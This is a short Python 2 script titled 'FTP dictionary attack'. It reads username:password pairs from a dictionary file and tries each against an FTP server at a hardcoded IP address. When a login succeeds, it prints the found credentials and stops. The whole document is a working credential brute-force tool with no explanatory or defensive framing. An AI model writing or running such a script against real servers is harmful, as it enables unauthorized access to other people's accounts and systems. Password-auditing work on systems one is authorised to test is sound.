# FTP dictionary attack
from ftplib import FTP

IP_TARGET = '172.16.254.100'


def test_credentials(username, password):
    try:
        ftp = FTP(IP_TARGET)
        ftp.login(user=username, passwd=password)
        print 'Find it! This is the user and password for the ftp server ' + username + ':' + password
        ftp.quit()
        return 1
    except:
        print 'Nope! Not this combination ' + username + ':' + password
        return 0


def main():
    with open('dictionary.txt', 'r') as dictionary:
        for line in dictionary:
                credentials = line.split(':')
                if test_credentials(username=credentials[0], password=credentials[1].rstrip()) == 1:
                    break


if __name__ == '__main__':
    main()